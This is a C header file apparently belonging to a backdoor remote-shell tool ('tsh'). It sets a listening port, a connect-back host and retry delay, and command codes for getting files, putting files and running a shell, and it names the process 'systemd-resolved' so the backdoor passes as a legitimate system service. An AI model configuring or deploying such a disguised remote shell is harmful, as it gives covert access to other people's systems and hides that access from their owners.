#ifndef _TSH_H
#define _TSH_H

char *cb_host = NULL;

#define SERVER_PORT 1234
short int server_port = SERVER_PORT;

#define CONNECT_BACK_HOST  "localhost"
#define CONNECT_BACK_DELAY 5

#define PROCESS_NAME_LONG "/lib/systemd/systemd-resolved"
#define PROCESS_NAME_SHORT "systemd-resolved"

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
